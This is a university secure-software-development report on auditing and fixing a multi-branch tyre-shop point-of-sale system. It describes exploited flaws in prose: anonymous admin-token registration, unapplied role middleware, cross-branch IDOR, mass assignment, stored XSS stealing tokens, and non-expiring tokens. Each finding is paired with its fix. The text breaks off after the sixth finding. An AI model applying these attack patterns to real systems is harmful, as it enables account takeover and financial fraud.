# SE4030_SSD_Report_Updated

- Document ID: 1ggk8b-y_F74Xa286D8yrlpdYIwuJ0yeksaHk3kJ-Q1E
- Revision ID: ANLCKQkPieQKK6IKCavnM5f_g161NeNv5X23sSLeEMjVqLqyN-z8GJZ6r_lS3na0PM7F1L0CCbAjOdSlgQ_j1JcbEmK-JKoseeHIQBXk7rk
- Selected tab: all
- Protected controls: 0
- Opaque controls: 0
- Authoritative dropdowns: 0

Protected-control annotations are preservation instructions. Do not insert their displayed placeholder text to recreate a native control.

## Tab 1 (t.0)

[P00001 | 1:46 | NORMAL_TEXT]
Securing a Multi-Branch Point-of-Sale System

[P00002 | 46:83 | HEADING_1]
SE4030 - Secure Software Development

[P00003 | 83:94 | NORMAL_TEXT]
Assignment

[P00004 | 94:95 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00005 | 95:173 | NORMAL_TEXT]
Application: Pubudu Tyres POS / mini-ERP - Laravel 10 REST API + React 19 SPA

[P00006 | 173:174 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00007 | 177:184 | NORMAL_TEXT | TABLE row=0 col=0]
Member

[P00008 | 185:195 | NORMAL_TEXT | TABLE row=0 col=1]
IT number

[P00009 | 196:207 | NORMAL_TEXT | TABLE row=0 col=2]
Workstream

[P00010 | 209:229 | NORMAL_TEXT | TABLE row=1 col=0]
P.A.R.B. Subasingha

[P00011 | 230:241 | NORMAL_TEXT | TABLE row=1 col=1]
IT22098450

[P00012 | 242:289 | NORMAL_TEXT | TABLE row=1 col=2]
Access control, session management, OAuth/OIDC

[P00013 | 291:309 | NORMAL_TEXT | TABLE row=2 col=0]
R.M.K.N. Gunasena

[P00014 | 310:321 | NORMAL_TEXT | TABLE row=2 col=1]
IT22078582

[P00015 | 322:379 | NORMAL_TEXT | TABLE row=2 col=2]
Frontend attack surface and API response confidentiality

[P00016 | 381:394 | NORMAL_TEXT | TABLE row=3 col=0]
R.H.F. Hamna

[P00017 | 395:406 | NORMAL_TEXT | TABLE row=3 col=1]
IT22516916

[P00018 | 407:462 | NORMAL_TEXT | TABLE row=3 col=2]
Configuration, transport, dependencies, test suite, CI

[P00019 | 464:481 | NORMAL_TEXT | TABLE row=4 col=0]
R.M.M.P. Bandara

[P00020 | 482:493 | NORMAL_TEXT | TABLE row=4 col=1]
IT22249166

[P00021 | 494:574 | NORMAL_TEXT | TABLE row=4 col=2]
Input/business-logic integrity, auditability, frontend invoice request boundary

[P00022 | 575:576 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00023 | 576:577 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00024 | 577:578 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00025 | 578:579 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00026 | 579:580 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00027 | 580:581 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00028 | 581:582 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00029 | 582:583 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00030 | 583:584 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00031 | 584:585 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00032 | 585:586 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00033 | 586:587 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00034 | 587:608 | HEADING_1]
1. Executive Summary

[P00035 | 608:609 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00036 | 609:761 | NORMAL_TEXT]
We took a production point-of-sale system that our team had previously built for a multi-branch tyre and auto-parts business, audited it, and fixed it.

[P00037 | 761:1005 | NORMAL_TEXT]
The audit found 19 distinct vulnerabilities. We fixed 14 and documented 5 as deliberately deferred with reasons. We also implemented Google OpenID Connect sign-in using the Authorization Code flow with PKCE, applied to the staff login feature.

[P00038 | 1005:1102 | NORMAL_TEXT]
Three findings stand out, because each one alone was sufficient to compromise the entire system:

[P00039 | 1102:1170 | NORMAL_TEXT]
An unauthenticated endpoint that issued administrator credentials. 

[P00040 | 1170:1272 | NORMAL_TEXT]
POST /api/register sat outside every middleware group and accepted the caller's own choice of role . 

[P00041 | 1272:1412 | NORMAL_TEXT]
One anonymous HTTP request returned a working admin bearer token. Every other access control in the application was downstream of this one.

[P00042 | 1412:1472 | NORMAL_TEXT]
An authorization layer that was built and never installed. 

[P00043 | 1472:1548 | NORMAL_TEXT]
The application contained a correct AdminMiddleware , correctly registered.

[P00044 | 1548:1747 | NORMAL_TEXT]
It was applied to exactly zero routes. Being signed in as any cashier was sufficient to cancel invoices, rewrite stock quantities, reprice goods, zero a customer's debt and read every profit report.

[P00045 | 1747:1811 | NORMAL_TEXT]
Stored cross-site scripting that stole administrator sessions. 

[P00046 | 1811:1812 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00047 | 1812:2035 | NORMAL_TEXT]
The thermal-receipt printer built HTML by string concatenation with no escaping anywhere in the codebase and the one function that looked like a sanitiser had had its.replace() deleted, so it returned its input unchanged. 

[P00048 | 2035:2036 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00049 | 2036:2102 | NORMAL_TEXT]
A cashier could save a customer name containing a script payload;

[P00050 | 2102:2271 | NORMAL_TEXT]
it fired when an administrator later printed that invoice, exfiltrating the admin's token from localStorage a token which, because of a separate finding, never expired.

[P00051 | 2271:2295 | NORMAL_TEXT]
The measurable outcome:

[P00052 | 2298:2299 | NORMAL_TEXT | TABLE row=0 col=0]
⟦EMPTY PARAGRAPH⟧

[P00053 | 2300:2315 | NORMAL_TEXT | TABLE row=0 col=1]
        Before

[P00054 | 2316:2317 | NORMAL_TEXT | TABLE row=0 col=2]
⟦EMPTY PARAGRAPH⟧

[P00055 | 2318:2324 | NORMAL_TEXT | TABLE row=0 col=3]
After

[P00056 | 2326:2354 | NORMAL_TEXT | TABLE row=1 col=0]
Attack scripts that succeed

[P00057 | 2355:2356 | NORMAL_TEXT | TABLE row=1 col=1]
⟦EMPTY PARAGRAPH⟧

[P00058 | 2357:2405 | NORMAL_TEXT | TABLE row=1 col=2]
12 / 12 core suite + V-20 reproduced separately

[P00059 | 2406:2413 | NORMAL_TEXT | TABLE row=1 col=3]
0 / 14

[P00060 | 2415:2435 | NORMAL_TEXT | TABLE row=2 col=0]
Composer advisories

[P00061 | 2436:2437 | NORMAL_TEXT | TABLE row=2 col=1]
⟦EMPTY PARAGRAPH⟧

[P00062 | 2438:2441 | NORMAL_TEXT | TABLE row=2 col=2]
41

[P00063 | 2442:2444 | NORMAL_TEXT | TABLE row=2 col=3]
0

[P00064 | 2446:2483 | NORMAL_TEXT | TABLE row=3 col=0]
npm advisories (2 critical, 14 high)

[P00065 | 2484:2485 | NORMAL_TEXT | TABLE row=3 col=1]
⟦EMPTY PARAGRAPH⟧

[P00066 | 2486:2489 | NORMAL_TEXT | TABLE row=3 col=2]
23

[P00067 | 2490:2492 | NORMAL_TEXT | TABLE row=3 col=3]
0

[P00068 | 2494:2519 | NORMAL_TEXT | TABLE row=4 col=0]
Automated security tests

[P00069 | 2520:2521 | NORMAL_TEXT | TABLE row=4 col=1]
⟦EMPTY PARAGRAPH⟧

[P00070 | 2522:2524 | NORMAL_TEXT | TABLE row=4 col=2]
0

[P00071 | 2525:2545 | NORMAL_TEXT | TABLE row=4 col=3]
90 (230 assertions)

[P00072 | 2546:2547 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00073 | 2547:2759 | NORMAL_TEXT]
All findings were confirmed by executing the attack, not by reading code. Every fix is verified by a runnable script and by a regression test that fails against the original and passes against the fixed version.

[P00074 | 2759:2760 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00075 | 2760:2761 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00076 | 2761:2762 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00077 | 2762:2763 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00078 | 2763:2764 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00079 | 2764:2783 | HEADING_1]
2. The application

[P00080 | 2783:2784 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00081 | 2784:2880 | NORMAL_TEXT]
A point-of-sale and inventory system for a tyre shop with multiple branches, in production use.

[P00082 | 2880:2979 | NORMAL_TEXT]
Backend - Laravel 10.50 / PHP 8.1, Sanctum bearer tokens, MySQL. 14 API controllers, ~102 routes. 

[P00083 | 2979:3033 | NORMAL_TEXT]
Frontend - React 19, Vite, Tailwind, axios. 24 pages.

[P00084 | 3033:3357 | NORMAL_TEXT]
Domain features: invoicing with cash and credit sales, FIFO batch stock allocation, a customer credit ledger, goodsreceived notes with adjustment history, a discount-request approval workflow (cashier requests → administrator approves), multi-branch separation by "department", staff management, and sales/profit reporting.

[P00085 | 3357:3598 | NORMAL_TEXT]
Why this application qualifies? It is our own prior work, not a teaching application. It is not WebGoat, DVWA or any deliberately vulnerable target, and the hardened version was not publicly available before this assignment. It has genuine 

[P00086 | 3598:3772 | NORMAL_TEXT]
Scope: real money, real customer PII, multi-tenancy, a role model and an approval workflow is enough structure for authorization flaws to be meaningful rather than academic.

[P00087 | 3772:3945 | NORMAL_TEXT]
Baseline: The unmodified code is tagged v0-original-vulnerable in both new repositories. Backend last original commit d997cbc (18 May 2026); frontend 52b7707 (27 May 2026).

[P00088 | 3945:3982 | HEADING_2]
Selected live vulnerability evidence

[P00089 | 3982:4159 | NORMAL_TEXT]
Four representative live application screens are included as concise evidence, one for each presenter. The complete before/after results remain in the automated evidence files.

[P00090 | 4159:4161 | NORMAL_TEXT]
[INLINE_OBJECT i.0]

[P00091 | 4161:4265 | NORMAL_TEXT]
Figure 4. Ravindu - V-02 original employee profit report showing revenue, cost, profit and margin data.

[P00092 | 4265:4267 | NORMAL_TEXT]
[INLINE_OBJECT i.1]

[P00093 | 4267:4381 | NORMAL_TEXT]
Figure 5. Malith - V-10 original invoice screen showing the client-controlled price and discount-request surface.

[P00094 | 4381:4383 | NORMAL_TEXT]
[INLINE_OBJECT i.2]

[P00095 | 4383:4493 | NORMAL_TEXT]
Figure 6. Hamna - V-09 secure login screen used during the security-response and configuration demonstration.

[P00096 | 4493:4495 | NORMAL_TEXT]
[INLINE_OBJECT i.3]

[P00097 | 4495:4588 | NORMAL_TEXT]
Figure 7. Nimthra - V-20 secure employee stock view without wholesale-cost or margin fields.

[P00098 | 4588:4605 | HEADING_2]
2.1 Threat model

[P00099 | 4605:4690 | NORMAL_TEXT]
We worked from three attackers, which is what makes the severity ratings meaningful.

[P00100 | 4690:4924 | NORMAL_TEXT]
A1 - The anonymous internet. Can reach the API. Before our work: could create an administrator account (V-01), script the API from any website (V-08), and download /.env , /composer.lock and /storage/logs/laravel.log directly (V-07).

[P00101 | 4924:5417 | NORMAL_TEXT]
A2 - A dishonest cashier. Holds a valid employee token. This is the realistic insider: a shop employee with a till. Before our work: could sell at any price they chose (V-10), erase a customer's debt with no ledger entry (V-04), read every other branch's customers and invoices (V-03), void sales to conceal cash theft (V-02), read company-wide profit and margin (V02), and inspect supplier cost and margin in ordinary GRN/stock API responses (V-20). Critically, none of it was logged (V-11).

[P00102 | 5417:5673 | NORMAL_TEXT]
A3 - A network or supply-chain attacker. Before our work: bearer tokens crossed one hop in cleartext (V-15), a poisoned spreadsheet reached a parser with two known CVEs (V-17 + V-12), and the production hostnames were published in a committed .env (V-14).

[P00103 | 5673:5916 | NORMAL_TEXT]
The asset that matters most is not the customer list it is the integrity of the money record. A POS system that cannot prove what was sold, at what price, by whom, is worthless as a book of account. Several findings below attack exactly that.

[P00104 | 5916:5917 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00105 | 5917:5918 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00106 | 5918:5919 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00107 | 5919:5920 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00108 | 5920:5921 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00109 | 5921:5936 | HEADING_1]
3. Methodology

[P00110 | 5936:5937 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00111 | 5937:6019 | NORMAL_TEXT]
We combined four techniques deliberately, because each find what the others miss.

[P00112 | 6019:6409 | NORMAL_TEXT]
Manual code review (white box). The primary technique and the one that found the most severe issues. V-01 and V-02 are invisible to a scanner that does not know which routes ought to be privileged a scanner sees POST /register returning 201 and calls it working. Reading routes/api.php next to Kernel.php and noticing that a registered middleware alias appears nowhere is a human activity.

[P00113 | 6409:6529 | NORMAL_TEXT]
Software composition analysis. composer audit and npm audit. Immediate and decisive: 41 and 23 advisories respectively.

[P00114 | 6529:6895 | NORMAL_TEXT]
Dynamic testing (black box). We wrote evidence/poc/run-all.mjs , a suite of scripts that perform each attack against a running instance and report VULNERABLE or FIXED. This is the core of our evidence, because it removes the ambiguity in "we think we fixed it". It is a single command with a pass/fail exit code, so it also serves as the demonstration in the video.

[P00115 | 6895:7043 | NORMAL_TEXT]
Regression testing. 90 PHPUnit tests (230 assertions) plus 19 Vitest tests, each written to fail against v0-originalvulnerable and pass afterwards.

[P00116 | 7043:7088 | HEADING_2]
3.1 A note on verifying rather than assuming

[P00117 | 7088:7205 | NORMAL_TEXT]
Three times during this work the evidence contradicted the initial reading, and each correction improved the result.

[P00118 | 7205:7717 | NORMAL_TEXT]
We initially recorded V-10 as "client-supplied totals and spoofable inv_by ". Reading InvoiceController::store properly showed the server did compute the totals itself ( :58-75 ) and did force inv_by from the token ( :106 ). The real defect was narrower and, once understood, more interesting: the server computed correct totals from line prices the attacker supplied. That is the more instructive finding, because the code looks defensive  and it is what makes the entire discount-approval workflow decorative.

[P00119 | 7717:7973 | NORMAL_TEXT]
An early PoC run reported V-04 and V-10 as already fixed. Both had returned HTTP 500. A 500 is not a security control; it was a malformed test payload. Had we accepted it, we would have reported two vulnerabilities as absent that were in fact exploitable.

[P00120 | 7973:8331 | NORMAL_TEXT]
A later run reported V-10 as fixed for the wrong reason. The V-02 probe ("can an employee reprice stock?") set the catalogue price to 1 as a side effect, so V-10's "sell a 32,000 LKR tyre for 1 LKR" check was comparing 1 against 1 and passing. We made the V-02 probe restore the price and V-10 read the live catalogue price instead of a hard-coded constant.

[P00121 | 8331:8482 | NORMAL_TEXT]
The general lesson, and one of the best-practice points in §8: a test that passes tells you nothing unless you have seen it fail for the right reason.

[P00122 | 8482:8483 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00123 | 8483:8484 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00124 | 8484:8485 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00125 | 8485:8486 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00126 | 8486:8487 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00127 | 8487:8522 | HEADING_1]
4. Vulnerabilities found and fixed

[P00128 | 8522:8523 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00129 | 8523:8614 | NORMAL_TEXT]
Ordered by severity. Each entry gives evidence, exploit, root cause, fix and verification.

[P00130 | 8614:8678 | HEADING_2]
V-01 · Unauthenticated registration issued administrator tokens

[P00131 | 8678:8783 | NORMAL_TEXT]
OWASP A01:2021 Broken Access Control, CWE-862, CWE-269, CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) ·

[P00132 | 8783:8792 | NORMAL_TEXT]
Critical

[P00133 | 8792:8793 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00134 | 8793:8795 | NORMAL_TEXT]
[INLINE_OBJECT d.18]

[P00135 | 8795:8797 | NORMAL_TEXT]
[INLINE_OBJECT d.19]

[P00136 | 8797:8931 | NORMAL_TEXT]
treated as ordinary user input rather than as a privilege assignment. Either alone is survivable; together they are total compromise.

[P00137 | 8931:9158 | NORMAL_TEXT]
Fix. The route moved inside auth:sanctum + admin . Registration no longer issues a token at all: an administrator creating a staff account has no business receiving that account's session. Password policy strengthened (V-05c).

[P00138 | 9158:9242 | NORMAL_TEXT]
Verified. POST /register unauthenticated → 401, no user created. As a cashier → 403

[P00139 | 9242:9243 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00140 | 9243:9244 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00141 | 9244:9245 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00142 | 9245:9246 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00143 | 9246:9247 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00144 | 9247:9248 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00145 | 9248:9249 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00146 | 9249:9250 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00147 | 9250:9251 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00148 | 9251:9302 | NORMAL_TEXT]
V-02 · The role gate was written and never applied

[P00149 | 9302:9355 | NORMAL_TEXT]
OWASP A01:2021 / API5:2023 BFLA · CWE-285 · Critical

[P00150 | 9355:9356 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00151 | 9356:9426 | NORMAL_TEXT]
Evidence. The application already contained a correct implementation:

[P00152 | 9426:9428 | NORMAL_TEXT]
[INLINE_OBJECT d.21]

[P00153 | 9428:9501 | NORMAL_TEXT]
Exploit. With an ordinary cashier's token, not one of these was refused:

[P00154 | 9504:9512 | NORMAL_TEXT | TABLE row=0 col=0]
Request

[P00155 | 9513:9520 | NORMAL_TEXT | TABLE row=0 col=1]
Result

[P00156 | 9521:9528 | NORMAL_TEXT | TABLE row=0 col=2]
Impact

[P00157 | 9530:9556 | NORMAL_TEXT | TABLE row=1 col=0]
GET /reports/daily-profit

[P00158 | 9557:9561 | NORMAL_TEXT | TABLE row=1 col=1]
200

[P00159 | 9562:9593 | NORMAL_TEXT | TABLE row=1 col=2]
Company-wide profit and margin

[P00160 | 9595:9618 | NORMAL_TEXT | TABLE row=2 col=0]
GET /reports/customers

[P00161 | 9619:9623 | NORMAL_TEXT | TABLE row=2 col=1]
200

[P00162 | 9624:9649 | NORMAL_TEXT | TABLE row=2 col=2]
The entire customer list

[P00163 | 9651:9688 | NORMAL_TEXT | TABLE row=3 col=0]
POST /grn-items/update-selling-price

[P00164 | 9689:9693 | NORMAL_TEXT | TABLE row=3 col=1]
200

[P00165 | 9694:9718 | NORMAL_TEXT | TABLE row=3 col=2]
Reprice any stock batch

[P00166 | 9720:9739 | NORMAL_TEXT | TABLE row=4 col=0]
PUT /invoices/{id}

[P00167 | 9740:9748 | NORMAL_TEXT | TABLE row=4 col=1]
reached

[P00168 | 9749:9763 | NORMAL_TEXT | TABLE row=4 col=2]
Void any sale

[P00169 | 9765:9792 | NORMAL_TEXT | TABLE row=5 col=0]
POST /grns/adjust-quantity

[P00170 | 9793:9801 | NORMAL_TEXT | TABLE row=5 col=1]
reached

[P00171 | 9802:9827 | NORMAL_TEXT | TABLE row=5 col=2]
Rewrite stock quantities

[P00172 | 9829:9864 | NORMAL_TEXT | TABLE row=6 col=0]
POST /customers/{id}/adjust-credit

[P00173 | 9865:9873 | NORMAL_TEXT | TABLE row=6 col=1]
reached

[P00174 | 9874:9899 | NORMAL_TEXT | TABLE row=6 col=2]
Zero any customer's debt

[P00175 | 9900:10328 | NORMAL_TEXT]
Root cause. This is the most instructive finding in the report. The security control was designed, implemented and registered and then not connected. Everything about the codebase says someone understood the requirement. What was missing was any mechanism that would notice the gap: no test asserted that a privileged route refuses an employee, and nothing in code review made "which routes are admin-only?" a visible question.

[P00176 | 10328:10487 | NORMAL_TEXT]
Tellingly, DiscountRequestController::approve:156 and reject:244 do contain inline role checks. The knowledge was present; the systematic application was not.

[P00177 | 10487:10999 | NORMAL_TEXT]
Fix. routes/api.php restructured into three explicit tiers public, auth:sanctum + active , and + admin with each placement decided by what the job actually requires and commented accordingly. Cashiers keep creating invoices, creating and finding customers, and taking credit payments. Cancelling an invoice, adjusting a credit balance, repricing and all cost/margin reporting became admin-only. The inline checks in DiscountRequestController are now backed by route middleware so a future handler cannot forget.

[P00178 | 10999:11171 | NORMAL_TEXT]
Verified. Eleven privileged endpoints, each asserted to return 403 for an employee and to remain reachable for an administrator a gate that refuses everybody is not a fix.

[P00179 | 11171:11172 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00180 | 11172:11173 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00181 | 11173:11174 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00182 | 11174:11175 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00183 | 11175:11176 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00184 | 11176:11177 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00185 | 11177:11178 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00186 | 11178:11179 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00187 | 11179:11230 | HEADING_2]
V-03 · IDOR no branch scoping on any record lookup

[P00188 | 11230:11231 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00189 | 11231:11233 | NORMAL_TEXT]
[INLINE_OBJECT d.30]

[P00190 | 11233:11429 | NORMAL_TEXT]
Ids are sequential integers, so an employee could walk the whole database: every customer's name, address, phone and NIC, every invoice, every stock batch and its cost price, across every branch.

[P00191 | 11429:11699 | NORMAL_TEXT]
Root cause. The classic shape of a broken-access-control defect: DiscountRequestController::index:116 does scope its query to the caller. One place got it right. The pattern was understood and simply not applied anywhere else, because nothing made the omission visible.

[P00192 | 11699:11794 | NORMAL_TEXT]
Fix. A ScopedToDepartment trait on Customer , Invoice and Grn , providing ->visibleTo($user) .

[P00193 | 11794:11823 | NORMAL_TEXT]
Two decisions worth stating:

[P00194 | 11823:12206 | NORMAL_TEXT]
[INLINE_OBJECT d.37] A trait with an explicit call site, not a global scope. A global scope would silently filter every query in the application including reports and background work and would be switched off by anyone writing withoutGlobalScopes() without understanding why it was there. ->visibleTo() is greppable the scoped call sites can be listed, and anything unscoped is visible by its absence.

[P00195 | 12206:12421 | NORMAL_TEXT]
[INLINE_OBJECT d.38] 404, not 403. A 403 confirms the record exists, letting an attacker enumerate ids and map another branch's data volumes without reading a field. "Not found" and "not yours" must be indistinguishable from outside.

[P00196 | 12421:12592 | NORMAL_TEXT]
A user with no department sees nothing, not everything treating a missing department_id as "all departments" would turn a data-entry omission into a privilege escalation.

[P00197 | 12592:12718 | NORMAL_TEXT]
Applied to 13 lookups plus the index() listings, since fixing only the {id} handlers would have leaked the same data in bulk.

[P00198 | 12718:12852 | NORMAL_TEXT]
Verified. Cross-branch reads → 404. Own-branch → 200. Administrator → sees all. Listing endpoints scoped. Orphaned user sees nothing.

[P00199 | 12852:12853 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00200 | 12853:12854 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00201 | 12854:12855 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00202 | 12855:12856 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00203 | 12856:12857 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00204 | 12857:12858 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00205 | 12858:12859 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00206 | 12859:12860 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00207 | 12860:12930 | HEADING_2]
V-04 · Mass assignment erased customer debt and rewrote business keys

[P00208 | 12930:12931 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00209 | 12931:12933 | NORMAL_TEXT]
[INLINE_OBJECT d.41]

[P00210 | 12933:12942 | NORMAL_TEXT]
Exploit.

[P00211 | 12942:12944 | NORMAL_TEXT]
[INLINE_OBJECT d.42]

[P00212 | 12944:13138 | NORMAL_TEXT]
The second exploit only succeeded on a customer with no invoices  on others the database foreign key blocked it. The application never objected, so that protection was incidental, not designed.

[P00213 | 13138:13268 | NORMAL_TEXT]
The same $request->all() pattern with no validation at all appeared in four more controllers, each exposing its own business key.

[P00214 | 13268:13422 | NORMAL_TEXT]
Root cause. A widespread misunderstanding of what validate() does. It is a genuinely confusing API: it looks like a filter and behaves like an assertion.

[P00215 | 13422:13451 | NORMAL_TEXT]
Fix. Two independent layers.

[P00216 | 13451:13701 | NORMAL_TEXT | LIST id=kix.list.2 level=0]
Model. Business keys removed from $fillable entirely and set once, at creation, by direct attribute assignment which is not subject to mass-assignment protection. If a controller ever regresses to update($request->all()) , the key still cannot move.

[P00217 | 13701:13797 | NORMAL_TEXT | LIST id=kix.list.2 level=0]
Controller. Every write assigns $validated only. The four unvalidated controllers gained rules.

[P00218 | 13797:13916 | NORMAL_TEXT]
credit_balance is declared prohibited on update with a message pointing at the ledger endpoints. An explicit 422 beats

[P00219 | 13916:14024 | NORMAL_TEXT]
silently dropping the field  a client that believes it wrote a balance and did not is its own class of bug.

[P00220 | 14024:14356 | NORMAL_TEXT]
Also fixed here, because it was masking this entire class of defect: every try/catch wrapping a validate() call caught \Exception , and ValidationException extends Exception so validation failures were swallowed and returned as 500 "Failed to update customer". Eleven catch clauses now re-throw so the handler renders a proper 422.

[P00221 | 14356:14437 | NORMAL_TEXT]
Verified. Both writes → 422, values unchanged, with an actionable error message.

[P00222 | 14437:14438 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00223 | 14438:14491 | HEADING_2]
V-05 · Authentication weaknesses (four sub-findings)

[P00224 | 14491:14513 | NORMAL_TEXT]
OWASP A07:2021 · High

[P00225 | 14513:14867 | NORMAL_TEXT]
V-05a: Username enumeration. AuthController.php:33 returned 404 "The provided username does not exist." versus :40 401 "The provided password is incorrect." An attacker could confirm which usernames exist cheaply, without guessing a password and only then spray. Usernames here are predictable staff names, so that first step was close to free. CWE-204.

[P00226 | 14867:15197 | NORMAL_TEXT]
Fixed: One response for both, 401 "The username or password is incorrect." A bcrypt comparison against a dummy hash runs when the user does not exist, so the response time does not leak what the message no longer does without it, a missing user returns in microseconds while a real one costs a full cost-12 bcrypt round. CWE-208.

[P00227 | 15197:15198 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00228 | 15198:15199 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00229 | 15199:15310 | NORMAL_TEXT]
V-05b: No brute-force protection. No limiter on /login ; the only restriction was the global 60/minute by IP. 

[P00230 | 15310:15311 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00231 | 15311:15322 | NORMAL_TEXT]
Confirmed:

[P00232 | 15322:15433 | NORMAL_TEXT]
20 consecutive wrong passwords, all processed, none throttled, and before V-11 — no log entry either. CWE-307.

[P00233 | 15433:15860 | NORMAL_TEXT]
Fixed with two limits applied together: 5/minute per username+IP (stops hammering one account) and 20/minute per IP (stops credential stuffing, where each attempt uses a different username and so would never trip a per-username limit). Per-minute limiting rather than a hard lockout, deliberately: a lockout on a shop till is itself a denial of service — an attacker knowing a cashier's username could lock them out mid-shift.

[P00234 | 15860:16004 | NORMAL_TEXT]
V-05c: Weak password policy. 'required|string|min:6' . Confirmed: "123456" was accepted. The most commonly used password in the world. CWE-521.

[P00235 | 16004:16316 | NORMAL_TEXT]
Fixed: 12 characters, mixed case, digit, symbol, plus uncompromised(). a Have I Been Pwned check using k-anonymity, so only the first five characters of the SHA-1 hash leave the server and the password never does. If that service is unreachable the rule passes rather than locking staff out of account creation.

[P00236 | 16316:16603 | NORMAL_TEXT]
V-05d: No self-service password change. The only path was the admin-only update , which did not require the current password. So any compromise of an admin token was a permanent takeover of every account, and a cashier who thought their password had been seen could do nothing. CWE-620.

[P00237 | 16603:16786 | NORMAL_TEXT]
Fixed: POST /change-password requiring the current password so a stolen token cannot be used to change the password and lock the real owner out and revoking every session afterwards.

[P00238 | 16786:16787 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00239 | 16787:16840 | HEADING_2]
V-06 · Tokens never expired and survived termination

[P00240 | 16840:16881 | NORMAL_TEXT]
OWASP A07:2021 · CWE-613, CWE-672 · High

[P00241 | 16881:17100 | NORMAL_TEXT]
Evidence. config/sanctum.php:49 'expiration' => null . Tokens issued with default ['*'] abilities, prior tokens never revoked, logout deleting only currentAccessToken() , and is_active checked at login and never again.

[P00242 | 17100:17130 | NORMAL_TEXT]
Exploit, executed end to end:

[P00243 | 17130:17173 | NORMAL_TEXT | LIST id=kix.list.3 level=0]
employee logs in            → token issued

[P00244 | 17173:17230 | NORMAL_TEXT | LIST id=kix.list.3 level=0]
admin sets is_active=false  → fresh logins refused (403)

[P00245 | 17230:17296 | NORMAL_TEXT | LIST id=kix.list.3 level=0]
the OLD token is replayed   → GET /me 200, still fully authorised

[P00246 | 17296:17638 | NORMAL_TEXT]
With no expiry, that access was permanent. A dismissed employee kept the ability to read customer records and cost prices and to cancel invoices. The personal_access_tokens table always had an expires_at column; nothing ever set it. This is also what made V-13 catastrophic rather than merely serious: a token stolen by XSS was good forever.

[P00247 | 17638:18111 | NORMAL_TEXT]
